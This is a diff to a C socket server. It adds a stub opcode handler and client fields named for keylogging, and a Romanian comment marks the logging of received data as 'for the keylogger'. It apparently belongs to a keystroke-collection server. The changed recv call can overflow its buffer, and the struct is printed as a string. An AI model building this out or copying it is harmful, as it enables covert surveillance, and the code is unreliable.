@@ -1,6 +1,7 @@
 #include "serverManager.h"
 #include "utils.h"
 #include "constraints.h"
+#include "messageManager.h"
 
 #include <string.h>
 #include <sys/socket.h>
@@ -8,6 +9,17 @@
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
+
+void handleOpcode(message_t msg, int clientSock)
+{
+    switch (msg.opCode)
+    {
+        
+    default:
+        printf("WRONG OPCODE(%c) FROM %d", msg.opCode, clientSock);
+        break;
+    }
+}
 
 void* handle_client(void* params)
 {
@@ -24,13 +36,15 @@ void* handle_client(void* params)
     }
 
     // Receive data from client
-    char client_message[BUFFER_SIZE];
+    message_t client_message;
     int read_size;
-    while ((read_size = recv(args->client_sock, client_message, BUFFER_SIZE, 0)) > 0) {
-        // Null-terminate the string received
-        client_message[read_size] = '\0';
+    while ((recv(args->client_sock, &client_message, BUFFER_SIZE, 0)) > 0) {
+
+
+        //HANDLE OPCODE***********************************
 
         // Write to the log file
+        //ASTA PENTRU KEYLOGGER
         fprintf(logFile, "%s", client_message);
         fflush(logFile);  // Ensure immediate write to file
     }
@@ -74,4 +88,11 @@ void sock_init(int *socket_desc, struct sockaddr_in* server)
         perror("Listen failed. Error");
         exit(-1);
     }
+}
+
+void setZeroClientHandler(clientAttributes_t* clientAttr)
+{
+    strcpy(clientAttr->name, "");
+    clientAttr->keylogger_fd = -1;
+    clientAttr->recordKeys = 1;
 }
